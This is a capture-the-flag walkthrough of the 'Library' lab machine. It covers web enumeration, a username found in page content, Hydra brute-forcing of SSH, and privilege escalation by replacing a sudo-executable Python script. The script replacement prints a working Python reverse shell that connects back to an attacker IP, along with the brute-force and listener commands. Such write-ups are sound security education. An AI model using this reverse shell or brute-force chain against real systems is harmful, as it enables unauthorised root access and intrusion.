# Library CTF Challenge Write-Up

## Overview

This walkthrough documents the compromise of the Library machine, beginning with service discovery and web enumeration and ending with full root compromise. The target exposes SSH and an Apache web service. The initial foothold comes from a subtle authentication clue embedded in a public webpage comment, which reveals the username `meliodas` and leads to password discovery via Hydra. Once SSH access is obtained, the attacker enumerates the system and finds a sudo rule that allows the user to execute a script as root without a password. The privilege escalation path is then completed by replacing the script with a malicious payload, allowing a reverse shell to be executed as root.

The challenge combines:

- passive web reconnaissance
- credential discovery through public comments and password spraying
- SSH access as a low-privileged user
- `sudo` privilege abuse
- root shell execution via script replacement

---

## 1. Initial Reconnaissance

### Port Scanning

The first step is to identify open services on the target.

```bash
nmap 10.114.184.211
```

### Results

```text
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-29 09:35 -0400
Nmap scan report for 10.114.184.211
Host is up (0.31s latency).
Not shown: 998 closed tcp ports (reset)

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

This confirms the host exposes SSH on port 22 and a web service on port 80. The web service is the primary attack surface.

![Image Placeholder: Nmap scan output](./assets/nmap-scan.png)

---

## 2. Web Enumeration and Reconnaissance

### Directory Enumeration

The attacker enumerates the web server using Feroxbuster.

```bash
feroxbuster -u http://10.113.140.136/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
```

### Relevant Output

```text
200      GET        76l      240w     2629c http://10.113.140.136/
200      GET       39l      167w     1288c http://10.113.140.136/README.txt
200      GET        2l        4w       26c http://10.113.140.136/robots.txt
200      GET       21l       50w      459c http://10.113.140.136/security.txt
```

The HTTP page and supporting files are then inspected. The `robots.txt` and `security.txt` files do not reveal anything immediately useful. The main site content is inspected manually.

### Review of Public Web Content

The page contains comments that reveal several usernames:

```text
root
on June 29th 2009 at 23:35

Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut.

www-data
on June 29th 2009 at 23:40

Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut.

Anonymous
on June 29th 2009 at 23:59

Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut.
```

The key clue is a different HTML comment later in the page:

```html
Posted on <time datetime="2009-06-29T23:31+01:00">June 29th 2009</time> by <a href="#">meliodas</a>
```

This identifies `meliodas` as a valid user account name. The notes indicate that the username is then brute-forced using Hydra against SSH.

> Important: A public webpage comment can reveal valid usernames even when the application itself is not a login portal. In this challenge, it is the first foothold.

![Image Placeholder: Web comment with user name](./assets/web-comments.png)

---

## 3. Password Discovery and SSH Access

### Hydra Password Attack

The attacker uses Hydra against the SSH service with the username `meliodas` and a wordlist.

```bash
hydra -l meliodas -P /usr/share/wordlists/rockyou.txt ssh://10.114.184.211
```

### Discovered Credentials

```text
[ssh] host: 10.114.184.211   login: meliodas   password: ilovey......
```

The password is therefore recovered and the user is able to log in.

### SSH Login

```bash
ssh meliodas@10.114.184.211
```

### Result

```text
meliodas@ubuntu:~$
```

This provides initial interactive access to the host as a normal user.

![Image Placeholder: SSH access](./assets/ssh-login.png)

---

## 4. User Enumeration and Initial Access

Once authenticated, the attacker enumerates the home directory.

```bash
ls -la
```

### Output

```text
total 40
drwxr-xr-x 4 meliodas meliodas 4096 Aug 24  2019 .
drwxr-xr-x 3 root     root     4096 Aug 23  2019 ..
-rw-r--r-- 1 root     root      353 Aug 23  2019 bak.py
-rw------- 1 root     root       44 Aug 23  2019 .bash_history
-rw-r--r-- 1 meliodas meliodas  220 Aug 23  2019 .bash_logout
-rw-r--r-- 1 meliodas meliodas 3771 Aug 23  2019 .bashrc
drwx------ 2 meliodas meliodas 4096 Aug 23  2019 .cache
drwxrwxr-x 2 meliodas meliodas 4096 Aug 23  2019 .nano
-rw-r--r-- 1 meliodas meliodas 655 Aug 23  2019 .profile
-rw-r--r-- 1 meliodas meliodas 0 Aug 23  2019 .sudo_as_admin_successful
-rw-rw-r-- 1 meliodas meliodas 33 Aug 23  2019 user.txt
```

The user reads the flag file:

```bash
cat user.txt
```

This confirms the initial foothold and gives the user-level flag.

---

## 5. Sudo Enumeration and Privilege Escalation Vector

### Checking `sudo -l`

The next step is to understand what commands the user can run without a password.

```bash
sudo -l
```

### Relevant Output

```text
Matching Defaults entries for meliodas on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User meliodas may run the following commands on ubuntu:
    (ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py
```

This is the key privilege escalation issue:

- the user can execute Python commands as root
- the target file `bak.py` is located in the home directory
- the file is root-owned and not writable by the user
- but the user owns the directory, which allows the script to be removed and replaced

The user likely notices that the permissions on the script file itself are restrictive, but the directory is writable enough to replace the file.

### Review of `bak.py`

The script is inspected:

```bash
cat /home/meliodas/bak.py
```

It is a Python script that performs some task and is later replaced with a malicious version.

---

## 6. Privilege Escalation via Script Replacement

### Key Observation

The user does not have permission to directly modify `bak.py`, but they do own the directory and can delete the file and create a malicious replacement in its place.

This is the actual root cause:

- `sudo` allows executing `/usr/bin/python* /home/meliodas/bak.py` as root
- the script path is user-controlled in a writable directory
- replacing the script with a reverse shell payload results in code execution as root

### Malicious Payload Creation

The user deletes the original script and creates a new `bak.py` with a reverse shell.

```bash
rm bak.py
nano bak.py
```

```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.131.124",1234))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
import pty
pty.spawn("sh")
```

Then the user runs the script via sudo:

```bash
sudo /usr/bin/python3 /home/meliodas/bak.py
```

### Listener on Attacker Side

```bash
nc -lvnp 1234
```

Then the shell connects back:

```text
connect to [192.168.131.124] from (UNKNOWN) [10.114.184.211] ...
# id
uid=0(root) gid=0(root) groups=0(root)
```

This confirms a successful root shell.

![Image Placeholder: Root shell](./assets/root-shell.png)

---

## 7. Root Enumeration and Final Flag Retrieval

After the root shell is active, the attacker enumerates the root directory.

```bash
ls -la
```

### Output

```text
total 28
drwx------  3 root root 4096 Aug 24  2019 .
drwxr-xr-x 22 root root 4096 Aug 24  2019 ..
-rw-------  1 root root   43 Aug 24  2019 .bash_history
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
drwxr-xr-x  2 root root 4096 Aug 23  2019 .nano
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   33 Aug 24  2019 root.txt
```

The final flag is retrieved:

```bash
cat root.txt
```

This completes the challenge.

---

## 8. Summary of the Exploit Chain

1. Enumerated the host with `nmap`
2. Identified an Apache web server and SSH on the target
3. Inspected the page and found a clue revealing the username `meliodas`
4. Used Hydra against SSH and recovered the password
5. Logged in as `meliodas`
6. Ran `sudo -l` and discovered a NOPASSWD Python execution rule for `/home/meliodas/bak.py`
7. Replaced `bak.py` with a malicious reverse shell payload
8. Executed the script via `sudo`
9. Received a root shell
10. Read `/root/root.txt`

---

## 9. Key Takeaways

- Web content can reveal valid usernames even when no login interface is present.
- Password spraying against SSH is a common and effective technique when a valid username is discovered.
- `sudo -l` is essential for understanding privilege escalation paths.
- User-writable directories can be abused to replace root-executed scripts.
- A root-owned script executed via `sudo` is a classic privilege escalation vector if the script path can be replaced.

> Important: The vulnerability is not necessarily that the script itself is writable; the real issue is that the directory ownership and `sudo` rule allow the script to be replaced and executed as root.

---

## 10. Relevant Commands

```bash
nmap 10.114.184.211
feroxbuster -u http://10.113.140.136/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
hydra -l meliodas -P /usr/share/wordlists/rockyou.txt ssh://10.114.184.211
ssh meliodas@10.114.184.211
ls -la
sudo -l
cat /home/meliodas/bak.py
rm bak.py
nano bak.py
sudo /usr/bin/python3 /home/meliodas/bak.py
nc -lvnp 1234
id
ls -la /root
cat /root/root.txt
```

---

## Final Result

The Library challenge was solved by identifying the valid username from a public webpage comment, recovering the SSH password via Hydra, and then abusing a `sudo` rule that allowed execution of a Python script in a writable directory. Replacing the script with a reverse shell payload resulted in a root shell and access to the final flag.

![Image Placeholder: Final challenge completion](./assets/final-result.png)
